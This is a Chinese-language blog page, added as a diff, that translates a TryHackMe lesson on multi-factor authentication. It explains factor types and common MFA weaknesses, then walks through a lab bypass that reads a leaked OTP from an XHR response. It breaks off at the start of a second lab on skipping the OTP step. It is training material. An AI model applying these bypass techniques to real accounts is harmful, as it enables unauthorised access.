@@ -1,0 +1,483 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THMMulti-FactorAuthentication | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction多因素身份验证 (MFA) 在现代应用程序中发挥着重要作用。MFA 不再仅仅依赖于密码，而是增加了额外的防御层。本质上，MFA 是多种检查的组合。这些检查可能是您已知的信息（例如密码）、您拥有的信息（例如智能手机）以及您自身的信息（例如指纹）。通过使用这些层级，MFA 使威胁行为者更难以访问用户帐户或应用程序。 目标在本课程结束时，您将：  了解 MFA 的运行原理及其在增">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THMMulti-FactorAuthentication">
+<meta property="og:url" content="https://blog.mikannse.cn/2025/06/03/THMMulti-FactorAuthentication/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction多因素身份验证 (MFA) 在现代应用程序中发挥着重要作用。MFA 不再仅仅依赖于密码，而是增加了额外的防御层。本质上，MFA 是多种检查的组合。这些检查可能是您已知的信息（例如密码）、您拥有的信息（例如智能手机）以及您自身的信息（例如指纹）。通过使用这些层级，MFA 使威胁行为者更难以访问用户帐户或应用程序。 目标在本课程结束时，您将：  了解 MFA 的运行原理及其在增">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2025-06-03T08:56:58.000Z">
+<meta property="article:modified_time" content="2025-06-03T08:58:40.149Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://blog.mikannse.cn/2025/06/03/THMMulti-FactorAuthentication/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THMMulti-FactorAuthentication',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2025-06-03 16:58:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">325</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THMMulti-FactorAuthentication</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-03T08:56:58.000Z" title="发表于 2025-06-03 16:56:58">2025-06-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-03T08:58:40.149Z" title="更新于 2025-06-03 16:58:40">2025-06-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THMMulti-FactorAuthentication"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>多因素身份验证 (MFA) 在现代应用程序中发挥着重要作用。MFA 不再仅仅依赖于密码，而是增加了额外的防御层。本质上，MFA 是多种检查的组合。这些检查可能是您已知的信息（例如密码）、您拥有的信息（例如智能手机）以及您自身的信息（例如指纹）。通过使用这些层级，MFA 使威胁行为者更难以访问用户帐户或应用程序。</p>
+<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>在本课程结束时，您将：</p>
+<ul>
+<li>了解 MFA 的运行原理及其在增强应用程序安全态势方面的重要性。</li>
+<li>探索 MFA 设置中使用的不同类型的身份验证因素。</li>
+<li>深入了解实施 MFA 以保护敏感数据和系统的实际场景。</li>
+</ul>
+<h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><p>在开始本课程之前，您应该对以下概念有基本的了解：</p>
+<ul>
+<li>熟悉身份验证机制的一般概念，包括密码和简单身份验证流程的工作原理。</li>
+<li>熟练掌握 Linux 命令行的基本操作和使用技能。</li>
+<li>完成 <a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/enumerationbruteforce">枚举与暴力破解</a> 房间测试。</li>
+</ul>
+<h1 id="How-MFA-Works"><a href="#How-MFA-Works" class="headerlink" title="How MFA Works"></a>How MFA Works</h1><p>在当今的数字时代，保护敏感数据和系统的安全比以往任何时候都更加重要。多重身份验证 (MFA) 要求您提供两个或更多验证因素，从而为用户帐户提供额外保护。这使得攻击者访问用户帐户的难度显著增加。</p>
+<p>需要注意的是，2FA（双因素身份验证）是 MFA（多重身份验证）的一个子集。MFA 是指任何需要两个或更多因素来验证用户身份的身份验证过程。</p>
+<h3 id="身份验证因素的类型"><a href="#身份验证因素的类型" class="headerlink" title="身份验证因素的类型"></a>身份验证因素的类型</h3><p>MFA 通常结合两种或多种不同类型的凭证，这些凭证来自以下类别：您知道的信息、您拥有的信息、您是谁、您在某个地方以及您做的事情。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724340924297.png" alt="img"></p>
+<p><strong>您知道的信息</strong></p>
+<p>这可能是密码、PIN 码或任何其他您必须记住的信息。它构成了大多数身份验证系统的基础，但如果不与其他因素同时使用，则可能存在漏洞。</p>
+<p><strong>您拥有的信息</strong></p>
+<p>这可能是您安装了身份验证应用程序的手机、安全令牌，甚至是智能卡。最近，我们看到客户端证书的使用越来越多，它们就像设备的数字身份证一样。</p>
+<p><strong>您身份的信息</strong></p>
+<p>这涉及生物识别技术，例如指纹、面部识别或虹膜扫描。这种身份验证方式越来越受欢迎，因为它很难伪造，现在在我们的许多设备中都能找到，从手机到笔记本电脑。需要注意的是，指纹和面部扫描都无法完全匹配。因此，这应该始终作为补充，切勿单独使用。</p>
+<p><strong>您身在何处</strong></p>
+<p>这涉及您的原始 IP 地址或地理位置。某些应用程序（例如在线银行服务）如果检测到您从未知 IP 地址发出请求，就会限制某些活动。</p>
+<p><strong>您的操作</strong></p>
+<p>这种身份验证通常用于限制机器人交互的应用程序，例如注册页面。应用程序通常会分析用户输入凭据或移动鼠标的方式，这也是最难实现的，因为应用程序需要特定的处理能力。</p>
+<p>双重身份验证 (2FA) 明确要求其中两个因素。因此，虽然所有双重身份验证 (2FA) 都是多重身份验证 (MFA)，但并非所有多重身份验证 (MFA) 都是双重身份验证 (2FA)。例如，需要密码、指纹扫描和智能卡的身份验证系统将被视为多重身份验证 (MFA)，但不被视为双重身份验证 (2FA)。</p>
+<h3 id="双重身份验证-2FA-的种类"><a href="#双重身份验证-2FA-的种类" class="headerlink" title="双重身份验证 (2FA) 的种类"></a>双重身份验证 (2FA) 的种类</h3><p>双重身份验证 (2FA) 可以利用各种机制来确保每个身份验证因素都提供强大的安全层。一些最常用的方法包括：</p>
+<p><strong>基于时间的一次性密码 (TOTP)</strong></p>
+<p>这些是每 30 秒左右更改一次的临时密码。 Google Authenticator、Microsoft Authenticator 和 Authy 等应用都使用它们，这使得黑客很难拦截或重复使用它们。</p>
+<p><strong>推送通知</strong></p>
+<p>Duo 或 Google Prompt 等应用会直接向您的手机发送登录请求。您可以直接从设备批准或拒绝访问，从而增加了一层安全保障，以验证用户是否拥有注册该帐户的设备。</p>
+<p>一次涉及推送通知的攻击，即 MFA 疲劳攻击，使攻击者能够入侵 Uber 员工的公司帐户。此次攻击的细节不在本讨论范围之内，但如需了解更多详情，您可以访问 Uber 的官方安全新闻室，网址为<a target="_blank" rel="noopener" href="https://www.uber.com/newsroom/security-update">此处</a>。</p>
+<p><strong>短信</strong></p>
+<p>目前大多数应用都使用这种方法。系统会向用户注册的电话号码发送一条包含一次性验证码的短信。用户必须输入此验证码才能继续登录。基于短信的身份验证虽然方便，但由于存在拦截短信的漏洞，安全性较低。</p>
+<p><strong>硬件令牌</strong></p>
+<p>像 YubiKey 这样的设备可以生成一次性密码或使用 NFC 进行身份验证。它们的优点在于无需网络或电池，即使在离线状态下也能工作。</p>
+<h3 id="条件访问"><a href="#条件访问" class="headerlink" title="条件访问"></a>条件访问</h3><p>公司通常使用条件访问来根据不同情况调整身份验证要求。它就像一棵决策树，根据特定条件触发额外的安全检查。例如：</p>
+<p><strong>基于位置</strong></p>
+<p>如果用户从其常用位置（例如办公室）登录，他们可能只需要提供常规登录凭据。但如果他们从新的或不熟悉的位置登录，系统可能会要求额外的 OTP 甚至生物识别验证。</p>
+<p><strong>基于时间</strong></p>
+<p>在正常工作时间内，用户可能只需使用常规登录凭据即可登录。但是，如果有人试图在下班后访问系统，系统可能会提示他们输入额外的安全措施，例如一次性密码 (OTP) 或安全令牌。</p>
+<p><strong>行为分析</strong></p>
+<p>假设用户的行为突然发生变化，例如开始访问通常不查看的数据，或者在非正常时间访问。在这种情况下，系统可以要求进行额外的身份验证，以确认用户的身份。</p>
+<p><strong>设备特定</strong></p>
+<p>在某些情况下，公司不允许员工使用自己的设备访问公司资源。在这种情况下，如果用户使用的是未经批准的设备，系统可能会在初始登录步骤后阻止用户。</p>
+<h3 id="全球采用和监管推动"><a href="#全球采用和监管推动" class="headerlink" title="全球采用和监管推动"></a>全球采用和监管推动</h3><p>由于 MFA 能够有效防御许多常见的安全威胁，包括网络钓鱼、社会工程和基于密码的攻击，因此其在各个领域的应用正在迅速扩展。世界各国政府和各行各业都认识到 MFA 的重要性，并开始通过各种监管框架强制使用 MFA。例如，金融和医疗保健行业实施严格的 MFA 要求，以遵守欧洲的《通用数据保护条例》(GDPR)、美国的《健康保险流通与责任法》(HIPAA) 以及全球支付系统的 PCI-DSS 等法规。</p>
+<p>如果实施了 MFA，许多违规行为，例如 2017 年的 Equifax 数据泄露事件和 2013 年的 Target 数据泄露事件，都可以被避免。</p>
+<h2 id="Implementations-and-Applications"><a href="#Implementations-and-Applications" class="headerlink" title="Implementations and Applications"></a>Implementations and Applications</h2><p>多重身份验证 (MFA) 现已成为保护我们线上线下活动免受威胁者攻击的重要因素。从银行、医疗保健到企业 IT，这些行业都严重依赖 MFA 来保护数据免受攻击者的攻击。</p>
+<h3 id="银行业中的-MFA"><a href="#银行业中的-MFA" class="headerlink" title="银行业中的 MFA"></a>银行业中的 MFA</h3><p>银行每天都处理极其敏感的信息和交易。通过使用 MFA，银行可以保护用户的个人和财务信息免受网络盗窃、欺诈和其他在线威胁的侵害。</p>
+<p>通常，银行会要求您输入密码（您知道的密码），然后再进行第二层安全保护，第二层安全保护是通过短信发送或由您手机上的应用程序生成的代码（您拥有的密码）。这样，即使有人获得了您的密码，他们仍然需要这些额外的信息才能访问您的帐户或完成交易。</p>
+<h3 id="医疗保健中的多重身份验证-MFA"><a href="#医疗保健中的多重身份验证-MFA" class="headerlink" title="医疗保健中的多重身份验证 (MFA)"></a>医疗保健中的多重身份验证 (MFA)</h3><p>在医疗保健领域，根据美国《健康保险流通与责任法案》(HIPAA) 等法规，多重身份验证 (MFA) 确保只有授权人员才能访问患者记录和个人健康信息。</p>
+<p>例如，为了访问电子健康记录 (EHR) 等敏感系统，医疗保健提供商可能会要求医生使用安全徽章（他们拥有的）和指纹扫描（他们本身拥有的）。这确保只有拥有正确凭证的人员才能查看或更改患者数据。</p>
+<h3 id="企业-IT-中的多重身份验证-MFA"><a href="#企业-IT-中的多重身份验证-MFA" class="headerlink" title="企业 IT 中的多重身份验证 (MFA)"></a>企业 IT 中的多重身份验证 (MFA)</h3><p>随着网络攻击和数据泄露事件的不断增加，企业 IT 部门面临着保护敏感业务数据和维护系统完整性的巨大压力。多重身份验证 (MFA) 有助于降低未经授权访问的风险，从而避免数据盗窃、间谍活动或破坏。</p>
+<p>在企业环境中，MFA 通常用于访问公司网络、数据库和云服务。员工可以先使用公司凭证（他们知道的东西）登录，然后通过公司发放的手机上发送的代码（他们拥有的东西）或通过生物特征验证（他们本身的东西）来验证身份。这样，即使有人试图攻击他们的系统，他们也会在没有第二个因素的情况下遇到障碍。</p>
+<h1 id="Common-Vulnerabilities-in-MFA"><a href="#Common-Vulnerabilities-in-MFA" class="headerlink" title="Common Vulnerabilities in MFA"></a>Common Vulnerabilities in MFA</h1><h3 id="弱-OTP-生成算法"><a href="#弱-OTP-生成算法" class="headerlink" title="弱 OTP 生成算法"></a>弱 OTP 生成算法</h3><p>一次性密码 (OTP) 的安全性取决于其生成算法。如果算法弱或过于容易预测，攻击者很容易就能猜测到 OTP。如果算法不使用真正的随机种子，生成的 OTP 可能会遵循某种模式，使其更容易被预测。</p>
+<h3 id="应用程序泄露双重身份验证令牌"><a href="#应用程序泄露双重身份验证令牌" class="headerlink" title="应用程序泄露双重身份验证令牌"></a>应用程序泄露双重身份验证令牌</h3><p>如果应用程序数据处理不当或存在漏洞（例如不安全的 API 端点），则可能会在应用程序的 HTTP 响应中意外泄露双重身份验证令牌。</p>
+<p>由于编码不安全，某些应用程序也可能会在响应中泄露双重身份验证令牌。一种常见的情况是，当用户登录后到达双重身份验证页面时，应用程序会向发出 OTP 的端点触发 XHR 请求。有时，此 XHR 请求会在 HTTP 响应中将 OTP 返回给用户。</p>
+<h3 id="暴力破解一次性密码-OTP"><a href="#暴力破解一次性密码-OTP" class="headerlink" title="暴力破解一次性密码 (OTP)"></a>暴力破解一次性密码 (OTP)</h3><p>尽管 OTP 的设计初衷是一次性使用，但它们并非完全不受暴力破解攻击的影响。如果攻击者可以进行无限次猜测，他们最终可能会得到正确的 OTP，尤其是在 OTP 没有受到其他安全措施良好保护的情况下。这就像试图通过反复旋转拨盘直到保险箱发出咔嗒声来破解保险箱一样，如果有足够的时间且没有任何限制，这种方法或许就能奏效。</p>
+<p><strong>缺乏速率限制</strong></p>
+<p>如果没有适当的速率限制，应用程序很容易让攻击者轻易地尝试不同的 OTP。如果攻击者能够在短时间内提交多次猜测，则会增加其获得正确 OTP 的可能性。</p>
+<p>例如，在 HackerOne 的这份报告 (<a target="_blank" rel="noopener" href="https://hackerone.com/reports/121696">https://hackerone.com/reports/121696</a>) 中，测试人员能够报告一个有效的漏洞，因为该应用程序在检查双重身份验证 (2FA) 代码时没有使用速率限制。</p>
+<h3 id="Evilginx-的使用"><a href="#Evilginx-的使用" class="headerlink" title="Evilginx 的使用"></a>Evilginx 的使用</h3><p><a target="_blank" rel="noopener" href="https://github.com/kgretzky/evilginx2">Evilginx</a> 是一款常用于红队攻击的工具。它可以用于执行复杂的网络钓鱼攻击，有效绕过多因素身份验证 (MFA)。它充当中间人代理，可以拦截并重定向原本发送给合法用户的 OTP。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1725369125262.png" alt="img"></p>
+<p>Evilginx 的工作原理是，当攻击者向您发送网络钓鱼链接，并且您在看似合法的登录页面上输入您的凭据时，Evilginx 会捕获您的用户名、密码和 OTP，然后将它们转发到真实网站，让攻击者使用您的 cookie 进行访问，而无需破解您的 MFA。</p>
+<h1 id="Practical-OTP-Leakage"><a href="#Practical-OTP-Leakage" class="headerlink" title="Practical - OTP Leakage"></a>Practical - OTP Leakage</h1><h3 id="OTP-泄漏"><a href="#OTP-泄漏" class="headerlink" title="OTP 泄漏"></a>OTP 泄漏</h3><p>XHR（XMLHttpRequest）响应中的 OTP 泄漏通常是由于 2FA（双因素身份验证）机制实现不当或编码不安全造成的。一些常见原因包括：</p>
+<p><strong>服务器端验证和敏感数据返回</strong></p>
+<p>在一些设计不良的应用程序中，服务器会验证 OTP，并且不仅仅是确认成功或失败，而是在响应中返回 OTP 本身。这通常是无意为之，例如在调试、日志记录或响应处理不当的过程中。</p>
+<p><strong>缺乏适当的安全实践</strong></p>
+<p>开发人员可能会忽视在 API 响应中暴露 OTP 等敏感信息的安全隐患。这种情况通常发生在开发人员专注于使应用程序正常运行而没有考虑攻击者如何利用这些响应时。</p>
+<p>并非所有开发人员都充分了解安全编码实践。他们可能会在没有充分了解在 XHR 响应中暴露敏感信息的潜在风险的情况下实现 2FA 等功能。</p>
+<p><strong>生产环境中残留的调试信息</strong></p>
+<p>在开发或测试阶段，开发人员可能会在响应中包含详细的调试信息，以帮助诊断问题。如果在部署到生产环境之前未删除这些调试响应，则 OTP 等敏感信息可能会被泄露。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <a target="_blank" rel="noopener" href="http://mfa.thm/labs/first%E3%80%82">http://mfa.thm/labs/first。</a></p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724159560073.png" alt="img"></p>
+<p>使用以下凭据登录应用程序。</p>
+<table>
+<thead>
+<tr>
+<th><strong>Username</strong></th>
+<th><strong>Password</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="mailto:thm@mail.thm">thm@mail.thm</a></td>
+<td>test123</td>
+</tr>
+</tbody></table>
+<p><strong>注意：</strong>打开浏览器的开发者工具（通常按 F12 键），然后在点击登录按钮之前先导航到“网络”选项卡。此选项卡允许您查看应用程序发出的所有网络请求，包括 XHR 请求。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724158550681.png" alt="img"></p>
+<p>进入 MFA 页面后，您将看到由应用程序触发的 XHR 请求，该请求已发送到 /token 端点。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724158550679.png" alt="img"></p>
+<p>正如您在上面提交到 /token 端点的 XHR 请求中所看到的，应用程序返回了一个大小为 16 字节的响应。单击此请求并导航到“响应”选项卡，如下所示。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724158892046.png" alt="img"></p>
+<p>复制令牌参数的值并将其粘贴到 OTP 表单中，然后单击验证帐户。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724158998707.png" alt="img"></p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1725365364567.png" alt="img"></p>
+<p>为了解决这个问题，应用程序不应在响应中返回生成的 2FA 或 OTP。建议不要返回 OTP，而是返回“成功”之类的通用消息。</p>
+<h1 id="Practical-Insecure-Coding"><a href="#Practical-Insecure-Coding" class="headerlink" title="Practical - Insecure Coding"></a>Practical - Insecure Coding</h1><h3 id="逻辑缺陷还是不安全的编码？"><a href="#逻辑缺陷还是不安全的编码？" class="headerlink" title="逻辑缺陷还是不安全的编码？"></a>逻辑缺陷还是不安全的编码？</h3><p>在某些应用程序中，逻辑缺陷或不安全的编码实践可能导致应用程序的关键部分（例如仪表板）在未完全完成身份验证过程的情况下被访问。具体来说，攻击者可能能够完全绕过双重身份验证 (2FA) 机制，无需输入 OTP（一次性密码）即可访问仪表板或其他敏感区域。这通常是由于会话管理不当、访问控制检查不完善或逻辑实现错误导致未能强制执行双重身份验证 (2FA) 要求造成的。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <a target="_blank" rel="noopener" href="http://mfa.thm/labs/second/">http://mfa.thm/labs/second/</a> 并使用以下凭据登录应用程序。</p>
+<table>
+<thead>
+<tr>
+<th><strong>Username</strong></th>
+<th><strong>Password</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="mailto:thm@mail.thm">thm@mail.thm</a></td>
+<td>test123</td>
+</tr>
+</tbody></table>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724240238973.png" alt="img"></p>
+<p>通常，攻击者首先需要了解应用程序的登录和双重身份验证 (2FA) 流程。在这种情况下，用户输入用户名和密码后，系统会提示用户输入一次性密码 (OTP) 以访问仪表板。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724240239383.png" alt="img"></p>
